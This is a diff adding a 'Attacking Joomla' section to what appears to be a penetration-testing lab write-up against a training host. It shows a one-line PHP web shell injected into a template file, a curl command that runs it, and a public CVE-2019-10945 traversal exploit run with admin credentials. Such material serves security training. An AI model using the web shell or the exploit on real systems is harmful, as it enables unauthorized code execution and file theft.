@@ -14,6 +14,7 @@ This document outlines common techniques for identifying and exploiting vulnerab
     - [Attacking WordPress](#attacking-wordpress)
     - [Joomla - Discovery and Enumeration](#joomla---discovery-and-enumeration)
     - [Attacking Joomla](#attacking-joomla)
+    - [Drupal - Discovery and Enumeration](#drupal---discovery-and-enumeration)
 
 ---
 
@@ -472,3 +473,95 @@ admin:turnkey
 ---
 
 ### Attacking Joomla
+
+Using the credentials obtained during enumeration (`admin:turnkey`), authentication to the Joomla administrator backend is successful:
+
+```
+http://dev.inlanefreight.local/administrator/
+```
+
+![Filtered output](images/joomla7.PNG)
+
+With administrative access, the primary goal is to achieve remote code execution (RCE) by injecting a PHP web shell.
+
+Joomla allows administrators to customize template files directly through the backend interface. This functionality can be abused to inject malicious PHP code. Go to the `Configuration` &rarr; `Templates` to get to the templates menu.
+
+![Filtered output](images/joomla8.PNG)
+
+Two templates are available:
+
+- `Beez3`
+- `Protostar`
+
+![Filtered output](images/joomla9.PNG)
+
+Click on the **Protostar** template under the `Template` column to access the template editor:
+
+![Filtered output](images/joomla10.PNG)
+
+Select a PHP file such as `error.php`, and insert the following web shell:
+
+```php
+system($_GET['cmd']);
+```
+
+![Filtered output](images/joomla11.PNG)
+
+Click `Save & Close` and verify code execution by issuing a request to the modified template:
+
+```bash
+curl -s http://dev.inlanefreight.local/templates/protostar/error.php?cmd=ls-la
+```
+
+Successful command execution confirms **remote code execution** on the target system:
+
+![Filtered output](images/joomla12.PNG)
+
+In some cases, administrative access may not be available, or direct template modification may be restricted. In such scenarios, exploitation often relies on **known vulnerabilities** in the Joomla core or installed extensions.
+
+The target is running Joomla version `3.9.4`, which can be confirmed as follows:
+
+```bash
+curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | head
+```
+
+![Filtered output](images/joomla13.PNG)
+
+Joomla `3.9.4`, released in 2019, is vulnerable to [CVE-2019-10945](https://www.cve.org/CVERecord?id=CVE-2019-10945).
+
+A short description of the vulnerability:
+
+```
+The Media Manager component does not properly sanitize the folder parameter, 
+allowing attackers to act outside the media manager root directory.
+```
+
+This flaw results in a **directory traversal vulnerability**, which can be abused to read arbitrary files and, in some configurations, escalate further.
+
+A public proof-of-concept exploit is available on **Exploit-DB**:
+
+```
+https://www.exploit-db.com/exploits/46710
+```
+
+Review the available options:
+
+```bash
+python3 CVE-2019-10945.py --help
+```
+
+![Filtered output](images/joomla14.PNG)
+
+Execute the exploit using valid credentials:
+
+```bash
+python3 CVE-2019-10945.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
+```
+
+![Filtered output](images/joomla15.PNG)
+
+This confirms successful exploitation of the vulnerability and demonstrates the risk posed by **outdated Joomla installations**.
+
+---
+
+### Drupal - Discovery and Enumeration
